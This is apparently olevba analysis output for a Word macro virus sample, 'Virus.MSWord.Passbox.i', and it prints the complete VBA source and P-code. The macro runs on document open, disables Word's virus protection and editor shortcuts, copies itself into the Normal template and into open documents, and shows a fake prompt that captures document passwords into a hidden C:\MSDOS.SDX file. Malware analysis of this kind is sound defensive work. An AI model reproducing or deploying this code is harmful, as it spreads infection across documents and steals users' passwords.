olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Passbox.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Passbox.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sniffer.bas 
in file: ./Virus.MSWord.Passbox.i - OLE stream: 'Macros/VBA/Sniffer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Fim
Lab
Infecta

Fim:
End Sub
Sub Infecta()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Application.EnableCancelKey = wdCancelDisabled
   CustomizationContext = NormalTemplate
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
   
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   DocumentInstalled = False
   GlobalInstalled = False
   
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "Sniffer" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Sniffer" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Sniffer", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Sniffer", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PBox.Show
      
Final:
    End Sub
Sub Lab()
On Error GoTo Fim

a$ = Space$(140) & "."
For r = 1 To Len(a$) Step 2
C$ = Right$(a$, r)
  For S = 1 To 20000
  Next S
StatusBar = (C$)
Next r

Fim:
End Sub

Sub Confere()
If PBox.TextBox1 = "" Then
   ActiveDocument.Close
   Unload PBox
   Else
   Grava
End If

End Sub
Sub Grava()
On Error Resume Next
Dim NJ
NJ = " Path: " & ActiveDocument.FullName & " <-> Senha: " & PBox.TextBox1
        For XY = 1 To Len(NJ)
                B = Asc(Mid(NJ, XY, 1))
                If C = 255 Then C = 148
                C = B - (92 * 3)
                If C < 0 Then C = C + 255
                If C = 165 Then C = 58
                D$ = D$ + Chr(C)
        Next XY
 
SetAttr "C:\MSDOS.SDX", 0
Open "C:\MSDOS.SDX" For Append As #1
Print #1, D$
Close #1
SetAttr "C:\MSDOS.SDX", 1 + 2 + 4
Unload PBox

End Sub

Sub ToolsMacro()
On Error GoTo Final

Final:
End Sub
Sub ViewVBCode()
On Error GoTo Final

Final:
End Sub
Sub FileTemplates()
On Error GoTo Fim

Fim:
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Passbox.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/Sniffer - 5650 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError Fim 
' Line #2:
' 	ArgsCall Lab 0x0000 
' Line #3:
' 	ArgsCall Infecta 0x0000 
' Line #4:
' Line #5:
' 	Label Fim 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Sub Infecta())
' Line #8:
' 	OnError Final 
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #15:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #16:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #17:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #18:
' Line #19:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #20:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #21:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #22:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #25:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Sniffer"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Next 
' Line #29:
' Line #30:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #31:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Sniffer"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' Line #36:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Sniffer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #39:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "PBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' Line #44:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Sniffer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "PBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #49:
' 	EndIfBlock 
' Line #50:
' Line #51:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Final 
' 	EndIf 
' Line #52:
' 	Ld PBox 
' 	ArgsMemCall Show 0x0000 
' Line #53:
' Line #54:
' 	Label Final 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub Lab())
' Line #57:
' 	OnError Fim 
' Line #58:
' Line #59:
' 	LitDI2 0x008C 
' 	ArgsLd Space$ 0x0001 
' 	LitStr 0x0001 "."
' 	Concat 
' 	St a$ 
' Line #60:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #61:
' 	Ld a$ 
' 	Ld r 
' 	ArgsLd Right$ 0x0002 
' 	St C$ 
' Line #62:
' 	StartForVariable 
' 	Ld S 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x4E20 
' 	For 
' Line #63:
' 	StartForVariable 
' 	Ld S 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Ld C$ 
' 	Paren 
' 	St StatusBar 
' Line #65:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' Line #67:
' 	Label Fim 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Sub Confere())
' Line #71:
' 	Ld PBox 
' 	MemLd TextBox1 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #73:
' 	Ld PBox 
' 	ArgsCall Unlock 0x0001 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	ArgsCall Grava 0x0000 
' Line #76:
' 	EndIfBlock 
' Line #77:
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub Grava())
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Dim 
' 	VarDefn NJ
' Line #82:
' 	LitStr 0x0007 " Path: "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x000C " <-> Senha: "
' 	Concat 
' 	Ld PBox 
' 	MemLd TextBox1 
' 	Concat 
' 	St NJ 
' Line #83:
' 	StartForVariable 
' 	Ld XY 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NJ 
' 	FnLen 
' 	For 
' Line #84:
' 	Ld NJ 
' 	Ld XY 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St B 
' Line #85:
' 	Ld C 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0094 
' 	St C 
' 	EndIf 
' Line #86:
' 	Ld B 
' 	LitDI2 0x005C 
' 	LitDI2 0x0003 
' 	Mul 
' 	Paren 
' 	Sub 
' 	St C 
' Line #87:
' 	Ld C 
' 	LitDI2 0x0000 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld C 
' 	LitDI2 0x00FF 
' 	Add 
' 	St C 
' 	EndIf 
' Line #88:
' 	Ld C 
' 	LitDI2 0x00A5 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x003A 
' 	St C 
' 	EndIf 
' Line #89:
' 	Ld D$ 
' 	Ld C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St D$ 
' Line #90:
' 	StartForVariable 
' 	Ld XY 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' Line #92:
' 	LitStr 0x000C "C:\MSDOS.SDX"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #93:
' 	LitStr 0x000C "C:\MSDOS.SDX"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld D$ 
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #96:
' 	LitStr 0x000C "C:\MSDOS.SDX"
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #97:
' 	Ld PBox 
' 	ArgsCall Unlock 0x0001 
' Line #98:
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Sub ToolsMacro())
' Line #102:
' 	OnError Final 
' Line #103:
' Line #104:
' 	Label Final 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub ViewVBCode())
' Line #107:
' 	OnError Final 
' Line #108:
' Line #109:
' 	Label Final 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub FileTemplates())
' Line #112:
' 	OnError Fim 
' Line #113:
' Line #114:
' 	Label Fim 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' Line #118:
' Line #119:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

